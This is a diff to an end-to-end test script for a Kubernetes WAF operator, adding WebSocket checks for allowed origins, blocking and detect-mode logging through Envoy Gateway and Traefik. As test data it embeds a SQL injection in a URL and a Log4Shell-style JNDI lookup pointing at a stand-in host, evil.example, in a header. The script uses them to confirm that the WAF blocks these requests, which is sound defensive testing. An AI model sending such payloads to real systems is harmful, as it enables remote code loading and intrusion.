@@ -9,7 +9,9 @@
 # Envoy pods, attacks are blocked through both proxies, a body attack is
 # held back with its headers, one followed by HTTP/2 trailers is inspected
 # too, gRPC calls pass in block mode but not one with an attack in its
-# metadata (#284), which gets a gRPC status (#275), a response that leaks a
+# metadata (#284), which gets a gRPC status (#275), a WebSocket from an
+# allowed origin upgrades and echoes but one from another origin or with an
+# attack in its handshake gets no upgrade (#276), a response that leaks a
 # SQL error is replaced through Envoy Gateway in block mode and logged in
 # detect mode while the policy reports that Traefik can't inspect responses
 # (#274), and unprotecting or uninstalling leaves the user's objects as they
@@ -33,6 +35,9 @@ GATEWAY_API_VERSION=v1.7.0
 TRAEFIK_NS=traefik-e2e
 TRAEFIK_CHART_VERSION=41.6.1 # Traefik v3.7.13, as hack/kind/up.sh
 HOST=eg.e2e.example.com
+# The origin the policy allows WebSockets from (#276).
+WS_ORIGIN=https://app.e2e.example.com
+WS_IMAGE=inkwall-wsecho:e2e
 TRAEFIK_PORT=${E2E_TRAEFIK_PORT:-18080}
 CUSTOM_PORT=${E2E_EG_PORT:-18091}
 PLAIN_PORT=$((CUSTOM_PORT + 1))
@@ -118,6 +123,14 @@ ok "Envoy Gateway installed"
 "${KUBECTL[@]}" -n "$TRAEFIK_NS" rollout restart deployment/traefik-e2e >/dev/null
 "${KUBECTL[@]}" -n "$TRAEFIK_NS" rollout status deployment/traefik-e2e --timeout=180s >/dev/null
 
+# The WebSocket echo server (hack/wsecho), built here: test only, never
+# released.
+mkdir -p "$work/wsimg"
+CGO_ENABLED=0 go build -trimpath -o "$work/wsimg/wsecho" ./hack/wsecho
+printf 'FROM gcr.io/distroless/static-debian12:nonroot\nCOPY wsecho /wsecho\nENTRYPOINT ["/wsecho"]\n' >"$work/wsimg/Dockerfile"
+docker build -q -t "$WS_IMAGE" "$work/wsimg" >/dev/null
+kind load docker-image "$WS_IMAGE" --name "$CLUSTER" >/dev/null
+
 # The user's objects: an app, Envoy Gateway's class, an EnvoyProxy with a
 # field of the user's, a Gateway naming it, one naming none, a route on both
 # and an Ingress for Traefik.
@@ -169,6 +182,28 @@ spec:
   selector: {app: eg-e2e-grpc}
   ports: [{name: grpc, port: 5000, appProtocol: kubernetes.io/h2c}]
 ---
+# A WebSocket echo server.
+apiVersion: apps/v1
+kind: Deployment
+metadata: {name: wsecho, namespace: $NS}
+spec:
+  selector: {matchLabels: {app: eg-e2e-wsecho}}
+  template:
+    metadata: {labels: {app: eg-e2e-wsecho}}
+    spec:
+      containers:
+        - name: wsecho
+          image: $WS_IMAGE
+          imagePullPolicy: Never
+          args: ["-listen", ":8080"]
+---
+apiVersion: v1
+kind: Service
+metadata: {name: wsecho, namespace: $NS}
+spec:
+  selector: {app: eg-e2e-wsecho}
+  ports: [{name: http, port: 8080}]
+---
 apiVersion: gateway.networking.k8s.io/v1
 kind: GatewayClass
 metadata: {name: inkwall-e2e}
@@ -214,6 +249,9 @@ spec:
     - name: grpc
       matches: [{path: {type: PathPrefix, value: /grpc.health.v1.Health/}}]
       backendRefs: [{name: grpc, port: 5000}]
+    - name: ws
+      matches: [{path: {type: PathPrefix, value: /ws}}]
+      backendRefs: [{name: wsecho, port: 8080}]
 ---
 apiVersion: networking.k8s.io/v1
 kind: Ingress
@@ -230,9 +268,13 @@ spec:
           - path: /grpc.health.v1.Health/
             pathType: Prefix
             backend: {service: {name: grpc, port: {number: 5000}}}
+          - path: /ws
+            pathType: Prefix
+            backend: {service: {name: wsecho, port: {number: 8080}}}
 YAML
 "${KUBECTL[@]}" -n "$NS" rollout status deployment/app --timeout=120s >/dev/null
 "${KUBECTL[@]}" -n "$NS" rollout status deployment/grpc --timeout=120s >/dev/null
+"${KUBECTL[@]}" -n "$NS" rollout status deployment/wsecho --timeout=120s >/dev/null
 
 # What the user wrote, to compare with after the operator is gone.
 user_objects() {
@@ -311,6 +353,8 @@ spec:
   # more on a CI runner: past the default 250 ms, the engine fails closed
   # (503). Envoy waits 500 ms longer than this.
   timeout: 1s
+  webSocket:
+    allowedOrigins: ["$WS_ORIGIN"]
 ${2:-}
 YAML
 }
@@ -393,6 +437,25 @@ grpc_are() {
     [[ $("$work/grpchealth" -authority "$HOST" "${md[@]}" "127.0.0.1:$port") == "$want" ]] || return 1
   done
 }
+# ws_are RESULT PATH [ORIGIN [HEADER]]: a WebSocket handshake from ORIGIN
+# (default: the allowed one; "none": no Origin) with that extra header ends with RESULT
+# through both Gateways and Traefik: "upgraded" (101, and a message
+# echoed) or the status it got instead.
+ws_are() {
+  local want=$1 path=$2 origin=${3:-$WS_ORIGIN} args=() port
+  [[ $origin == none ]] && origin=
+  [[ -n ${4:-} ]] && args=(-header "$4")
+  for port in "$CUSTOM_PORT" "$PLAIN_PORT" "$TRAEFIK_PORT"; do
+    [[ $("$work/wsecho" -host "$HOST" -origin "$origin" "${args[@]}" "127.0.0.1:$port$path") == "$want" ]] || return 1
+  done
+}
+WS_EVIL=https://evil.example
+# logged_reason PATH REASON: an engine in the Envoy pods logged a
+# detect-mode event for PATH with that reason.
+logged_reason() {
+  "${KUBECTL[@]}" -n "$EG_NS" logs -l app.kubernetes.io/name=envoy -c inkwall-engine --tail=-1 |
+    grep '"security event"' | grep '"action":"log"' | grep "\"path\":\"$1\"" | grep "\"reason\":\"$2\"" >/dev/null
+}
 # grpc_denied_by_engine [KEY=VALUE...]: ... is PermissionDenied with the
 # engine's grpc-message, which names the request ID, not one the client
 # made up from an HTTP 403 ("unexpected HTTP status code ...") (#275).
@@ -438,6 +501,7 @@ no_wiring() {
 
 go build -o "$work/h2trailers" ./hack/h2trailers
 go build -o "$work/grpchealth" ./hack/grpchealth
+go build -o "$work/wsecho" ./hack/wsecho
 printf '\0\0\0\0\0' >"$work/grpc-empty" # one empty gRPC message
 for gw in custom plain; do
   eventually "Envoy Gateway runs Gateway $gw" envoy_pods "$gw"
@@ -446,6 +510,8 @@ forward_all
 eventually "the Gateways and Traefik serve the app" all_are 200 /
 check "no policy yet: the attack passes" all_are 200 "$SQLI"
 eventually "the Gateways and Traefik serve the gRPC service" grpc_are OK
+eventually "the Gateways and Traefik upgrade a WebSocket" ws_are upgraded /ws
+check "no policy yet: any origin upgrades" ws_are upgraded /ws "$WS_EVIL"
 
 echo "== one policy, two proxies"
 policy
@@ -498,6 +564,13 @@ check "a benign body with trailers (HTTP/2) passes" h2_are 200 / "q=hello"
 # on the binary body).
 check "a gRPC call passes" grpc_are OK
 check "a gRPC call with an attack in its metadata is denied" grpc_are PermissionDenied "$GRPC_ATTACK"
+# WebSocket (#276): Envoy held every handshake until its idle timeout
+# before v0.4.0, waiting for a body that comes only after the upgrade.
+check "a WebSocket from the allowed origin upgrades and echoes" ws_are upgraded /ws
+check "a WebSocket from another origin gets 403, no upgrade" ws_are 403 /ws "$WS_EVIL"
+check "a WebSocket without an Origin gets 403" ws_are 403 /ws none
+check "a WebSocket with an attack in its URL gets 403" ws_are 403 "/ws?room=1%27%20OR%20%271%27%3D%271"
+check "a WebSocket with an attack in a header gets 403" ws_are 403 /ws "$WS_ORIGIN" 'Sec-WebSocket-Protocol: ${jndi:ldap://evil.example/a}'
 check "and its client gets the engine's gRPC status, not an HTTP 403" grpc_denied_by_engine "$GRPC_ATTACK"
 check "a gRPC-Web call with an attack in its metadata gets grpc-status 7" grpc_web_denied
 
@@ -536,6 +609,9 @@ check "a body attack with trailers (HTTP/2) passes" h2_are 200 "$h2_path" "q=1%2
 eventually "the engines log its rule, not an oversized body" logged_rule "$h2_path"
 check "a gRPC call passes" grpc_are OK
 check "a gRPC call with an attack in its metadata passes" grpc_are OK "$GRPC_ATTACK"
+ws_path=/ws/detect-$RANDOM$RANDOM
+check "a WebSocket from another origin upgrades" ws_are upgraded "$ws_path" "$WS_EVIL"
+eventually "and the engines log its origin at once" logged_reason "$ws_path" websocket
 
 echo "== unprotected"
 "${KUBECTL[@]}" -n "$NS" delete wafpolicy shared --timeout=60s >/dev/null
